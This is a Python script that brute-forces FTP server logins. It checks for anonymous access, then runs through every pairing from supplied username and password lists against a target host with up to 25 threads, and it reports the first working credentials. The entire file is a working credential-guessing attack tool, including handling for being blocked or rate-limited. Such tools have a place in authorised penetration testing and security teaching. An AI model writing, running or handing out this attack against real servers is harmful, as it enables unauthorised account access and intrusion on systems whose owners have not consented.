#!/usr/bin/python3.9
#example of usage is ./ftpbrute.py localhost usernames passwords
#setup required libs
import ftplib
import sys #getopt would be a better usage but this will be fine for an example
import threading
import time
import os
#do simple bounds checking
if(len(sys.argv) != 4):
	print("Usage is " +  sys.argv[0] + " <hostname> <usernamelist> <passwordlist>")
	sys.exit(-1)

#setup ftp con
con = ftplib.FTP(sys.argv[1])
#test anon
try:
	con.login()
	#if no error occured the login was assumed to be a great success.
	print("Congrats logging in, anonymous login allowed.")
except ftplib.error_perm as eeeeeeeeee: #sorry about my variable names
	print("Error connecting, previous error was: " + str(eeeeeeeeee))
	#login failed

#read files to memory to not kill the disk
try: #can never assume people will run stuff right.
	with open(sys.argv[2]) as zefile:
		userlist = zefile.readlines()
	zefile.close() #cleanup
	with open(sys.argv[3]) as zeotherfile:
		passlist = zeotherfile.readlines()
	zeotherfile.close()
except FileNotFoundError as BigF:
	print("Usage is " +  sys.argv[0] + " <hostname> <usernamelist> <passwordlist>")
	sys.exit(-1)
#debug, check that files loaded something
if (len(userlist) < 1): #user list empty
	print("Userlist is empty, ensure you gave it the right file.")
	sys.exit(-1)
if (len(passlist) < 1): #pass list empty
	print("Passlist is empty, ensure you gave it the right file.")
	sys.exit(-1)
#variables finally setup 42 lines later... should be ready to actually brute
#define function for thread to call 
def bruteforce(host,user,passw):
	print("Attempting " + user + "::" + passw)
	con = ftplib.FTP(host) #not sure if threading in python has global or local memory space, ie is con shared or not
	try:
		con.login(user,passw)
		#if no error occured the login was assumed to be a great success.
		os.system("clear")
		print("Log in successful with: " + user + "::" + passw)
		#be nice with the service
		con.quit()
		con.close()
		os._exit(1)
	except ftplib.error_perm as eeeeeeeeee: #sorry about my variable names
		#reconnect instead of re-using same connection
		con = ftplib.FTP(sys.argv[1])
		print("Log in failed, " + user + "::" + passw + " Error -> " + str(eeeeeeeeee))
		#login failed
	except EOFError: #eoferror from ftplib is apparently a empty return value
		print("It would appear we have been blocked...")
	except ftplib.error_temp as temperror:
		print("You are getting too many connection errors, you should probably turn down the thread count")
#time to loop it using files, very rudiminterary, would use threads here for faster speeds
#edit, modified with threads
for user in userlist:
	#clear newlines
	user = user.rstrip("\n")
	for passw in passlist:
		passw = passw.rstrip("\n")
		
		#test the creds here
		try:
			while(threading.active_count() >= 25): #sloppy way of waiting for threads to finish but seemed to work ok for this example
				time.sleep(0.5)
			threading.Thread(target=bruteforce, args=(sys.argv[1],user,passw,)).start()	
		except KeyboardInterrupt:
			print("Exiting... Cleaning up threads")
			for t in threading.enumerate():
				try:
					t.join(timeout=1.0)
					sys.exit(0)
				except KeyboardInterrupt:
					print("Closing now...")
					sys.exit(0)
				except RuntimeError:
					pass #this error occurs when a thread is opening i believe
#if code reaches here no username / pass combo found
#give threads time to finish
print("Cleaning up threads.")
for t in threading.enumerate():
	try:
		t.join(timeout=10.0)
	except KeyboardInterrupt:
		print("Closing now... No creds were found")
		sys.exit(0)
	except RuntimeError:
		pass #this error occurs when a thread is opening i believe
print("No valid username / password combo found :(")

#could probably shorten this down a bit but it seems to do the job fine.
